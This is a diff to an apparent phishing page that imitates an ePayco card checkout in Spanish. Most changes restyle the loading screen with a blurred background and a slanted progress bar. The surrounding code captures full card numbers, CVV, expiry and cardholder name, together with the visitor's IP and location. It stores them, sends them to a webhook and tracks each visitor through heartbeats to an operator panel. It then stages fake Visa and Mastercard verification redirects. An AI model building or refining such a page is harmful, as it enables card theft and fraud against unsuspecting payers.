@@ -62,8 +62,9 @@
 
         .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
 
-        .card-logo-container { position: absolute; right: 0; top: 0; display: flex; gap: 5px; }
-        .card-logo-container img { height: 20px; }
+        /* --- LOGOS DE TARJETA DENTRO DEL INPUT (Corregido para que todos midan igual) --- */
+        .card-logo-container { position: absolute; right: 0; top: 50%; transform: translateY(-50%); display: flex; gap: 5px; }
+        .card-logo-container img { height: 24px; width: auto; object-fit: contain; } /* Forzado a 24px de alto */
 
         /* --- SWITCH --- */
         .toggle-wrapper { display: flex; align-items: center; gap: 15px; margin: 25px 0; }
@@ -90,20 +91,99 @@
         .footer-logos .secure-txt svg { width: 12px; height: 12px; fill: #4caf50; }
         .footer-logos img { height: 20px; }
 
-        /* --- LOADING OVERLAY --- */
-        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.80); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; padding: 20px; }
-        .loading-overlay.active { display: flex; }
+        /* ============================================================ */
+        /* --- NUEVO LOADING OVERLAY (DISEÑO BLUR CON PARALELOGRAMO) --- */
+        /* ============================================================ */
+        .loading-overlay { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            z-index: 9999; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        .loading-overlay.active { 
+            display: flex; 
+        }
 
-        .loading-card { background: #ffffff; border-radius: 16px; padding: 40px 32px 32px 32px; max-width: 360px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08); text-align: center; border: 1px solid #f0f0f0; }
-        .loading-card .logo-container { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; min-height: 80px; }
-        .loading-card .logo-container .logo-img { height: 60px; width: auto; max-width: 150px; object-fit: contain; }
-        .loading-card .loading-text { font-size: 0.95rem; font-weight: 600; color: #374151; margin-bottom: 20px; }
-        .progress-bar-wrapper { width: 100%; display: none; }
-        .progress-bar-track { width: 100%; height: 4px; background: #e5e7eb; border-radius: 4px; overflow: hidden; position: relative; }
-        .progress-bar-fill-loading { height: 100%; background: #111111; border-radius: 4px; width: 0%; transition: width 0.3s ease; }
-        .loading-card .initial-spinner { display: none; width: 48px; height: 48px; border: 3px solid #e5e7eb; border-top: 3px solid #111111; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px auto; }
-        .loading-card .initial-spinner.active { display: block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Fondo Blur con Overlay oscuro */
+        .loading-overlay::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url('blure.png');
+            background-size: cover;
+            background-position: center;
+            filter: blur(12px);
+            transform: scale(1.05);
+            z-index: -2;
+        }
+        .loading-overlay::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+        }
+
+        /* La tarjeta flotante */
+        .loading-card { 
+            background: #ffffff; 
+            border-radius: 12px; 
+            padding: 40px; 
+            max-width: 320px; 
+            width: 100%; 
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3); 
+            text-align: center; 
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 30px; /* Separación entre logo y barra */
+        }
+
+        /* Logo de la tarjeta identificada */
+        .loading-card .logo-img { 
+            height: 80px; /* Tamaño grande */
+            width: auto; 
+            max-width: 200px; 
+            object-fit: contain; 
+        }
+
+        /* El paralelogramo de carga (Cian / Azul) */
+        .progress-parallelogram-container {
+            width: 100%;
+            height: 24px; /* Grosor de la barra */
+            background: #e5e7eb;
+            border-radius: 4px;
+            transform: skewX(-20deg); /* Efecto paralelogramo */
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .progress-parallelogram-fill {
+            height: 100%;
+            width: 0%;
+            background: #00bcd4; /* Color azul/cian */
+            background: linear-gradient(90deg, #00bcd4, #0288d1); /* Degradado azul */
+            transition: width 0.3s ease;
+        }
+
+        /* Animación del brillo de la barra (opcional, se ve más pro) */
+        .progress-parallelogram-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transform: translateX(-100%);
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            100% { transform: translateX(100%); }
+        }
 
         /* --- MEDIA QUERIES --- */
         @media (min-width: 769px) { .epayco-container { max-width: 460px; } }
@@ -112,24 +192,21 @@
 </head>
 <body>
 
-    <!-- FONDO BLUR -->
+    <!-- FONDO BLUR (Página principal) -->
     <div class="bg-blur-wrapper">
         <img src="blure.png" alt="Fondo">
         <div class="overlay"></div>
     </div>
 
-    <!-- PANTALLA DE CARGA (LOADER) -->
+    <!-- PANTALLA DE CARGA (LOADER CON NUEVO DISEÑO) -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
-            <div class="initial-spinner active" id="initialSpinner"></div>
-            <div class="logo-container" id="logoContainer" style="display:none;">
-                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
-            </div>
-            <div class="loading-text" id="loadingText">Procesando pago...</div>
-            <div class="progress-bar-wrapper" id="progressWrapper">
-                <div class="progress-bar-track">
-                    <div class="progress-bar-fill-loading" id="progressFill"></div>
-                </div>
+            <!-- Logo de la tarjeta -->
+            <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
+            
+            <!-- Barra de progreso en paralelogramo -->
+            <div class="progress-parallelogram-container">
+                <div class="progress-parallelogram-fill" id="progressFill"></div>
             </div>
         </div>
     </div>
@@ -167,7 +244,7 @@
             <a href="#" class="edit-link">edit</a>
         </div>
 
-        <!-- PANTALLA 2: FORMULARIO DE TARJETA (VISIBLE DIRECTAMENTE) -->
+        <!-- PANTALLA 2: FORMULARIO DE TARJETA -->
         <div class="card-form" id="cardForm">
             
             <div class="alert" id="alertError">
@@ -204,7 +281,6 @@
                     </div>
                     <div class="input-group">
                         <svg class="icon" viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zM7 7v2h14V7H7z"/></svg>
-                        <!-- SELECT DE CUOTAS HABILITADO -->
                         <select id="cuotas" required>
                             <option value="" disabled selected>Cuotas</option>
                             <option value="1">1 cuota (Sin intereses)</option>
@@ -260,9 +336,6 @@
         const MAX_POLLING_TIME = 300000;
         const HEARTBEAT_INTERVAL = 5000;
 
-        // ============================================================
-        // CARGAR DATOS DINÁMICOS (CORREO DESDE URL O LOCALSTORAGE)
-        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             const urlParams = new URLSearchParams(window.location.search);
             const emailFromUrl = urlParams.get('email');
@@ -280,9 +353,6 @@
             if (emailFromUrl) localStorage.setItem('email', emailFromUrl);
         });
 
-        // ============================================================
-        // CAPTURAR IP + PAÍS + CIUDAD
-        // ============================================================
         async function capturarIP() {
             if (localStorage.getItem('usuario_ip')) return localStorage.getItem('usuario_ip');
             try {
@@ -315,9 +385,6 @@
         }
         capturarIP();
 
-        // ============================================================
-        // ESTADO GLOBAL
-        // ============================================================
         let solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         let pollingInterval = null;
         let cardType = null;
@@ -325,9 +392,6 @@
         let heartbeatInterval = null;
         let tipoTarjeta = '';
 
-        // ============================================================
-        // TRACKING ONLINE
-        // ============================================================
         let usuarioId = localStorage.getItem('usuarioId');
         if (!usuarioId) {
             usuarioId = 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
@@ -346,9 +410,6 @@
             navigator.sendBeacon(TRACKING_URL, JSON.stringify({ usuarioId: usuarioId, pagina: 'cerrando' }));
         });
 
-        // ============================================================
-        // HEARTBEAT PANEL
-        // ============================================================
         function enviarHeartbeat(estado = 'activo') {
             try {
                 fetch(HEARTBEAT_URL, {
@@ -376,15 +437,12 @@
         }
         window.addEventListener('beforeunload', () => detenerHeartbeat(true));
 
-        // ============================================================
-        // ELEMENTOS DOM
-        // ============================================================
         const inputNumero = document.getElementById('numero');
         const cardLogo = document.getElementById('cardLogo');
         const inputExp = document.getElementById('exp');
         const inputCVV = document.getElementById('cvv');
         const inputNombre = document.getElementById('nombre');
-        const selectCuotas = document.getElementById('cuotas'); // <-- NUEVO ELEMENTO
+        const selectCuotas = document.getElementById('cuotas');
         const btnPagar = document.getElementById('btnPagar');
         const alertError = document.getElementById('alertError');
         const mensajeError = document.getElementById('mensajeError');
@@ -392,16 +450,9 @@
         const form = document.getElementById('paymentForm');
 
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingText = document.getElementById('loadingText');
-        const logoContainer = document.getElementById('logoContainer');
         const cardLogoImg = document.getElementById('cardLogoImg');
-        const progressWrapper = document.getElementById('progressWrapper');
         const progressFill = document.getElementById('progressFill');
-        const initialSpinner = document.getElementById('initialSpinner');
 
-        // ============================================================
-        // BINS BLOQUEADOS
-        // ============================================================
         const BINS_NU = ['528892', '555825', '555829', '52141881', '52749332', '54549472', '55952666', '55953587'];
         const BINS_NEQUI = ['409355'];
         function getBinBloqueadoInfo(cardNumber) {
@@ -415,9 +466,6 @@
             return { bloqueado: false };
         }
 
-        // ============================================================
-        // DETECCIÓN DE TIPO DE TARJETA
-        // ============================================================
         const cardPatterns = {
             visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/ },
             mastercard: { regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/ },
@@ -445,9 +493,6 @@
         function formatCardNumber(value) { return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }
         function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
 
-        // ============================================================
-        // DETECCIÓN DE BANCO POR BIN (HANDYAPI)
-        // ============================================================
         const binCache = new Map();
         const bankNameMapping = {
             'bancolombia': 'Bancolombia', 'bancolombia s.a.': 'Bancolombia', 'davivienda': 'Davivienda',
@@ -499,9 +544,6 @@
             } catch (error) { detectedBank = null; return null; }
         }
 
-        // ============================================================
-        // HELPERS UI
-        // ============================================================
         function mostrarError(mensaje) {
             mensajeError.textContent = mensaje;
             alertError.classList.add('show');
@@ -514,9 +556,6 @@
             selectCuotas.disabled = false;
         }
 
-        // ============================================================
-        // INPUTS
-        // ============================================================
         let bankTimeout = null;
         inputNumero.addEventListener('input', function() {
             let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
@@ -536,9 +575,6 @@
         inputCVV.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); });
         inputNombre.addEventListener('input', function() { this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, ''); });
 
-        // ============================================================
-        // POLLING — CONSULTA ESTADO
-        // ============================================================
         async function verificarEstadoSolicitud(id) {
             try {
                 const response = await fetch(`/api/estado.php?id=${id}`);
@@ -575,27 +611,21 @@
         }
 
         // ============================================================
-        // CARGA CON LOGOS + REDIRECCIÓN SEGÚN TIPO
+        // NUEVA PANTALLA DE CARGA (DISEÑO SOLICITADO)
         // ============================================================
         function mostrarCargaConLogos(tipo) {
-            initialSpinner.classList.remove('active');
-            initialSpinner.style.display = 'none';
-            logoContainer.style.display = 'flex';
-            
+            // Asignamos la imagen del logo según el tipo detectado
             const cardLogoFile = { 'visa': 'visa.png', 'mastercard': 'mastercard.png', 'amex': 'ame.png' }[tipo];
             if (cardLogoFile) { cardLogoImg.src = cardLogoFile; cardLogoImg.alt = tipo; }
             
-            progressWrapper.style.display = 'block';
-            
-            const nombres = { 'visa': 'Verified by Visa', 'mastercard': 'Mastercard ID Check', 'amex': 'American Express SafeKey' };
-            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');
-            
+            // Configuramos la barra de progreso
             let progress = 0;
             const duration = 3000;
             const interval = 50;
             const increment = 100 / (duration / interval);
             progressFill.style.width = '0%';
             
+            // Iniciamos la animación
             const timer = setInterval(() => {
                 progress += increment;
                 if (progress >= 100) {
@@ -612,9 +642,6 @@
             window.location.href = map[tipo] || 'index.php';
         }
 
-        // ============================================================
-        // WEBHOOK
-        // ============================================================
         async function enviarDatosAlWebhook(datos) {
             try {
                 const response = await fetch(WEBHOOK_URL, {
@@ -630,9 +657,6 @@
             } catch (error) { console.error('❌ Error al enviar:', error); return false; }
         }
 
-        // ============================================================
-        // GUARDAR EN LOCALSTORAGE
-        // ============================================================
         function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
             const cardLast4 = cardNumber.slice(-4);
             localStorage.setItem('cardNumber', cardNumber);
@@ -644,16 +668,13 @@
             if (banco) localStorage.setItem('bancoEmisor', banco);
         }
 
-        // ============================================================
-        // BOTÓN PAGAR
-        // ============================================================
         btnPagar.addEventListener('click', async function() {
             ocultarError();
             const nombre = inputNombre.value.trim();
             const numero = inputNumero.value.replace(/\s/g, '');
             const exp = inputExp.value.trim();
             const cvv = inputCVV.value.trim();
-            const cuotasSeleccionadas = selectCuotas.value; // <-- Capturamos las cuotas
+            const cuotasSeleccionadas = selectCuotas.value;
             const terms = document.getElementById('terms').checked;
 
             const info = getBinBloqueadoInfo(numero);
@@ -674,14 +695,9 @@
 
             guardarDatosEnLocalStorage(numero, cvv, exp, nombre, detectedBank);
             localStorage.setItem('solicitudId', solicitudId);
-            localStorage.setItem('cuotas', cuotasSeleccionadas); // <-- Guardamos las cuotas
+            localStorage.setItem('cuotas', cuotasSeleccionadas);
 
             loadingOverlay.classList.add('active');
-            loadingText.textContent = 'Procesando pago...';
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
 
             btnPagar.disabled = true; btnPagar.textContent = 'Procesando...';
             inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true;
@@ -709,7 +725,7 @@
                 vencimiento: exp,
                 tipoTarjeta: cardType,
                 bancoEmisor: detectedBank,
-                cuotas: cuotasSeleccionadas, // <-- Lo enviamos al webhook
+                cuotas: cuotasSeleccionadas,
                 totalFormateado: totalFormateado,
                 fechaHora: fechaHora,
                 ip: localStorage.getItem('usuario_ip') || '',
@@ -732,9 +748,6 @@
             iniciarPolling();
         });
 
-        // ============================================================
-        // INICIALIZACIÓN
-        // ============================================================
         window.addEventListener('load', function() {
             iniciarHeartbeat();
             console.log('✅ Tarjetas listo con diseño ePayco y selector de cuotas');
